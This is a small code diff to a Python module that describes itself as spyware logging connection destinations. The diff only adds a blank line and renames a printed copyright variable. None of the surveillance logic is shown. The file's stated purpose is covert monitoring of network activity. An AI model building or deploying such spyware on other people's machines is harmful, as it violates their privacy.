@@ -5,6 +5,7 @@
 This file implements a SpyWare for connection destinations.
 """
 
+
 ###################
 #    This file implements a SpyWare for connection destinations.
 #    Copyright (C) 2021, 2022, 2023  Maurice Lambert
@@ -48,5 +49,5 @@ try:
 except ImportError:
     from DomainsLogger import main as domainsSpy
 
-print(copyright)
+print(__copyright__)
 domainsSpy()
